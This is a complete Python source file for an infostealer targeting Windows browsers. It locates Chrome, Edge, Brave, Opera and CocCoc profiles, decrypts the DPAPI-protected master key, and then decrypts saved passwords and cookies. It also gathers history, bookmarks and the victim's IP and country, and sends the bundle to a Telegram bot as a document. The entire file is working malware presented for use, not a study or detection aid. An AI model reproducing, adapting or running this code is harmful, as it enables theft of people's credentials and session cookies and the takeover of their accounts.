import os
import sys
import time
import json
import base64
import ctypes
import random
import shutil
import sqlite3
import requests

from datetime import datetime
from Crypto.Cipher import AES

TELEGRAM_TOKEN = 'YOUR BOT TOKEN'
TELEGRAM_CHATID = 'YOUR CHAT ID'

WINTEMP = os.getenv("TEMP")
WINAPPDATA = os.getenv("APPDATA")
WINLCAPPDATA = os.getenv("LOCALAPPDATA")

while True:
    try:
        r = json.loads(requests.get("https://api.myip.com/").text)
        ip = r['ip']
        cc = r['cc']
        break
    except:
        time.sleep(3)
        pass

class BrowserStealer:


    def __init__(self):
        self.result = {
            "Time": datetime.now().strftime("%H:%M:%S - %d/%m/%Y"),
            "Data": {},
            "Locate": {}
        }
        self.locate = {
            "Chrome": {
                "main": WINLCAPPDATA + r"\Google\Chrome\User Data",
                "login": WINLCAPPDATA + r"\Google\Chrome\User Data\Default\Login Data",
                "cookie": WINLCAPPDATA + r"\Google\Chrome\User Data\Default\Network\Cookies",
                "history": WINLCAPPDATA + r"\Google\Chrome\User Data\Default\History",
                "bookmark": WINLCAPPDATA + r"\Google\Chrome\User Data\Default\Bookmarks",
                "localstate": WINLCAPPDATA + r"\Google\Chrome\User Data\Local State"
            },
            "CocCoc": {
                "main": WINLCAPPDATA + r"\CocCoc\Browser\User Data",
                "login": WINLCAPPDATA + r"\CocCoc\Browser\User Data\Default\Login Data",
                "cookie": WINLCAPPDATA + r"\CocCoc\Browser\User Data\Default\Network\Cookies",
                "history": WINLCAPPDATA + r"\CocCoc\Browser\User Data\Default\History",
                "bookmark": WINLCAPPDATA + r"\CocCoc\Browser\User Data\Default\Bookmarks",
                "localstate": WINLCAPPDATA + r"\CocCoc\Browser\User Data\Local State"
            },
            "MSEdge": {
                "main": WINLCAPPDATA + r"\Microsoft\Edge\User Data",
                "login": WINLCAPPDATA + r"\Microsoft\Edge\User Data\Default\Login Data",
                "cookie": WINLCAPPDATA + r"\Microsoft\Edge\User Data\Default\Network\Cookies",
                "history": WINLCAPPDATA + r"\Microsoft\Edge\User Data\Default\History",
                "bookmark": WINLCAPPDATA + r"\Microsoft\Edge\User Data\Default\Bookmarks",
                "localstate": WINLCAPPDATA + r"\Microsoft\Edge\User Data\Local State"
            },
            "Brave": {
                "main": WINLCAPPDATA + r"\BraveSoftware\Brave-Browser\User Data",
                "login": WINLCAPPDATA + r"\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
                "cookie": WINLCAPPDATA + r"\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
                "history": WINLCAPPDATA + r"\BraveSoftware\Brave-Browser\User Data\Default\History",
                "bookmark": WINLCAPPDATA + r"\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks",
                "localstate": WINLCAPPDATA + r"\BraveSoftware\Brave-Browser\User Data\Local State"
            },
            "Opera": {
                "main": WINAPPDATA + r"\Opera Software\Opera Stable",
                "login": WINAPPDATA + r"\Opera Software\Opera Stable\Login Data",
                "cookie": WINAPPDATA + r"\Opera Software\Opera Stable\Network\Cookies",
                "history": WINAPPDATA + r"\Opera Software\Opera Stable\History",
                "bookmark": WINAPPDATA + r"\Opera Software\Opera Stable\Bookmarks",
                "localstate": WINAPPDATA + r"\Opera Software\Opera Stable\Local State"
            }
        }

    def LoginExport(self):
        try:
            if 'Decrypted' in self.result["Data"][self.browser]["localstate"]:
                key = base64.b64decode(self.result["Data"][self.browser]["localstate"]["Decrypted"])
                dst = WINTEMP + f"/{self.browser}_{random.randint(11111, 99999)}_login.alxxx"
                shutil.copy(self.login, dst)
                conn = sqlite3.connect(dst)
                db = conn.cursor()
                db.execute("SELECT id, origin_url, username_value, password_value FROM 'logins'")
                for id, url, usr, pwd in db.fetchall():
                    iv = pwd[3:15]
                    enc = pwd[15:]
                    dec = AES.new(key, AES.MODE_GCM, iv).decrypt(enc)[:-16].decode()
                    self.result["Data"][self.browser]["login"][id] = {
                        url: {
                            usr: dec
                        }
                    }
                db.close()
                conn.close()
                os.remove(dst)
        except Exception as err:
            if os.path.isfile(dst):
                db.close()
                conn.close()
                os.remove(dst)
            print(err)
    
    def HistoryExport(self):
        try:
            dst = WINTEMP + f"/{self.browser}_{random.randint(11111, 99999)}_history.alxxx"
            shutil.copy(self.history, dst)
            conn = sqlite3.connect(dst)
            db = conn.cursor()
            db.execute("SELECT id, url, title FROM 'urls'")
            for id, url, title in db.fetchall():
                self.result["Data"][self.browser]["history"][id] = {title: url}
            db.close()
            conn.close()
            os.remove(dst)
        except Exception as err:
            if os.path.isfile(dst):
                db.close()
                conn.close()
                os.remove(dst)
            print(err)

    def BookmarkExport(self):
        try:
            obj = json.loads(open(self.bookmark, "rb").read())
            for o in obj["roots"]["bookmark_bar"]["children"]:
                id = o["id"]
                url = o["url"]
                name = o["name"]
                self.result["Data"][self.browser]["bookmark"][id] = {name: url}
        except Exception as err:
            print(err)
    
    def LocalStateExport(self):
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ('cbData', ctypes.c_ulong),
                ('pbData', ctypes.POINTER(ctypes.c_char))
            ]

        class CRYPTPROTECT_PROMPTSTRUCT(ctypes.Structure):
            _fields_ = [
                ('cbSize', ctypes.c_ulong),
                ('dwPromptFlags', ctypes.c_ulong),
                ('hwndApp', ctypes.c_void_p),
                ('szPrompt', ctypes.c_wchar_p)
            ]

        crypt32 = ctypes.WinDLL('crypt32.dll')

        CryptUnprotectData = crypt32.CryptUnprotectData
        CryptUnprotectData.restype = ctypes.c_bool
        CryptUnprotectData.argtypes = [
            ctypes.POINTER(DATA_BLOB),
            ctypes.POINTER(ctypes.c_wchar),
            ctypes.POINTER(DATA_BLOB),
            ctypes.c_void_p,
            ctypes.POINTER(CRYPTPROTECT_PROMPTSTRUCT),
            ctypes.c_ulong,
            ctypes.POINTER(DATA_BLOB)
        ]

        try:
            key = base64.b64decode(json.loads(open(self.localstate, 'r').read())['os_crypt']['encrypted_key'])[5:]
        except:
            return False

        cipher_blob = DATA_BLOB(len(key), ctypes.create_string_buffer(key))
        plain_blob = DATA_BLOB()

        success = CryptUnprotectData(
            ctypes.byref(cipher_blob),
            None,
            None,
            None,
            None,
            0,
            ctypes.byref(plain_blob)
        )

        if success:
            self.result["Data"][self.browser]["localstate"] = {
                "Encrypted": base64.b64encode(key).decode(),
                "Decrypted": base64.b64encode(ctypes.string_at(plain_blob.pbData, plain_blob.cbData)).decode()
            }

    def CookieExport(self):
        try:
            if 'Decrypted' in self.result["Data"][self.browser]["localstate"]:
                key = base64.b64decode(self.result["Data"][self.browser]["localstate"]["Decrypted"])
                dst = WINTEMP + f"/{self.browser}_{random.randint(11111, 99999)}_cookie.alxxx"
                shutil.copy(self.cookie, dst)
                conn = sqlite3.connect(dst)
                db = conn.cursor()
                db.execute("SELECT host_key, path, name, value, encrypted_value FROM 'cookies'")
                for host, path, name, value, enc_value in db.fetchall():
                    if value:
                        value = value
                    else:
                        value = AES.new(key, AES.MODE_GCM, enc_value[3:15]).decrypt(enc_value[15:])[:-16].decode()
                    if host+path in self.result["Data"][self.browser]["cookie"]:
                        self.result["Data"][self.browser]["cookie"][host+path][name] = value
                    elif host+path not in self.result["Data"][self.browser]["cookie"]:
                        self.result["Data"][self.browser]["cookie"][host+path] = {}
                        self.result["Data"][self.browser]["cookie"][host+path][name] = value
                db.close()
                conn.close()
                os.remove(dst)
        except Exception as err:
            if os.path.isfile(dst):
                db.close()
                conn.close()
                os.remove(dst)
            print(err)

    def main(self):
        while True:
            for self.browser in self.locate:
                if os.path.isdir(self.locate[self.browser]["main"]):
                    self.result["Locate"][self.browser] = {}
                    self.result["Data"][self.browser] = {}
                    if os.path.isfile(self.locate[self.browser]["login"]):
                        self.login = self.locate[self.browser]["login"]
                        self.result["Locate"][self.browser]["login"] = self.login
                        self.result["Data"][self.browser]["login"] = {}
                    if os.path.isfile(self.locate[self.browser]["cookie"]):
                        self.cookie = self.locate[self.browser]["cookie"]
                        self.result["Locate"][self.browser]["cookie"] = self.cookie
                        self.result["Data"][self.browser]["cookie"] = {}
                    if os.path.isfile(self.locate[self.browser]["history"]):
                        self.history = self.locate[self.browser]["history"]
                        self.result["Locate"][self.browser]["history"] = self.history
                        self.result["Data"][self.browser]["history"] = {}
                    if os.path.isfile(self.locate[self.browser]["bookmark"]):
                        self.bookmark = self.locate[self.browser]["bookmark"]
                        self.result["Locate"][self.browser]["bookmark"] = self.bookmark
                        self.result["Data"][self.browser]["bookmark"] = {}
                    if os.path.isfile(self.locate[self.browser]["localstate"]):
                        self.localstate = self.locate[self.browser]["localstate"]
                        self.result["Locate"][self.browser]["localstate"] = self.localstate
                        self.result["Data"][self.browser]["localstate"] = {}
                    self.LocalStateExport()
                    self.BookmarkExport()
                    self.HistoryExport()
                    self.LoginExport()
                    self.CookieExport()
            try:
                file = f'{WINTEMP}/{ip}_{cc}.json'
                data = json.dumps(self.result, indent=4)
                out = open(file, 'w')
                out.write(data)
                out.close()
                read = open(file, 'rb')
                url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument'
                sendDoc = {'document': read}
                chatID = {'chat_id': TELEGRAM_CHATID}
                req = requests.post(url, files=sendDoc, data=chatID)
                read.close()
                if req.status_code == 200:
                    os.remove(file)
                else:
                    print(req.status_code)
                    os.remove(file)
                exit()
            except Exception as err:
                print(err)
                time.sleep(120)
                pass


def main():
    try:
        browsers = BrowserStealer()
        browsers.main()
    except Exception as err:
        print(err)
        main()
main() if sys.platform == 'win32' else exit()
